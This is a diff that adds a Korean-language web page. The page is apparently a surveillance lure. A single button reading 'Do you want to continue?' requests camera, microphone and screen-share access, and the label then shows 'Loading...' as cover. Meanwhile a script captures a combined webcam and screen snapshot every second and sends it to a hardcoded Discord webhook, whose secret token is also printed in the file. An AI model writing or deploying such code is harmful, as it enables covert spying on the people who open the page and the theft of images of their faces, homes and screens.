@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <title>권한 요청 및 웹훅 전송</title>
+  <style>
+    body {
+      background-color: white;
+      margin: 0; padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+    }
+    button {
+      font-size: 20px;
+      padding: 10px 20px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button id="startBtn">계속하시겠습니까?</button>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1394213060721508488/tSbdVkvi7MH4LH_pLx5iScaGBnSGnSs10GJMP0DMJ3CXZJWw-P0Q5A-qE67UZaHr7t3q';
+    const startBtn = document.getElementById('startBtn');
+
+    startBtn.onclick = async () => {
+      startBtn.disabled = true;
+      startBtn.textContent = '로딩중...';
+
+      try {
+        // 카메라 + 오디오 권한 요청
+        const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        // 화면 공유 권한 요청
+        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+
+        startBtn.textContent = '로딩중...';
+
+        // 1초마다 캡처 및 전송
+        setInterval(() => {
+          sendToDiscord(cameraStream, screenStream);
+        }, 1000);
+
+      } catch (err) {
+        alert('권한 요청 실패 또는 거부됨: ' + err.message);
+        startBtn.disabled = false;
+        startBtn.textContent = '계속하시겠습니까?';
+      }
+    };
+
+    async function sendToDiscord(cameraStream, screenStream) {
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // 카메라 비디오 트랙으로부터 비디오 엘리먼트 생성
+        const cameraVideo = document.createElement('video');
+        cameraVideo.srcObject = new MediaStream([cameraStream.getVideoTracks()[0]]);
+        cameraVideo.play();
+
+        // 화면 비디오 트랙으로부터 비디오 엘리먼트 생성
+        const screenVideo = document.createElement('video');
+        screenVideo.srcObject = new MediaStream([screenStream.getVideoTracks()[0]]);
+        screenVideo.play();
+
+        // 비디오 로드 대기 (간단한 딜레이)
+        await new Promise(resolve => setTimeout(resolve, 500));
+
+        // 캔버스 크기 설정
+        canvas.width = 640;
+        canvas.height = 480;
+
+        // 카메라 캡처
+        ctx.drawImage(cameraVideo, 0, 0, canvas.width / 2, canvas.height);
+        // 화면 캡처 오른쪽 절반
+        ctx.drawImage(screenVideo, canvas.width / 2, 0, canvas.width / 2, canvas.height);
+
+        // 이미지 Blob 생성
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+
+        // 폼 데이터 생성
+        const formData = new FormData();
+        formData.append('file', blob, 'capture.png');
+
+        // 웹훅 전송
+        const res = await fetch(webhookURL, {
+          method: 'POST',
+          body: formData,
+        });
+
+        if (!res.ok) {
+          console.error('웹훅 전송 실패', await res.text());
+        } else {
+          console.log('웹훅 전송 성공');
+        }
+
+        // 비디오 정리
+        cameraVideo.pause();
+        screenVideo.pause();
+
+      } catch (error) {
+        console.error('전송 중 오류', error);
+      }
+    }
+  </script>
+</body>
+</html>
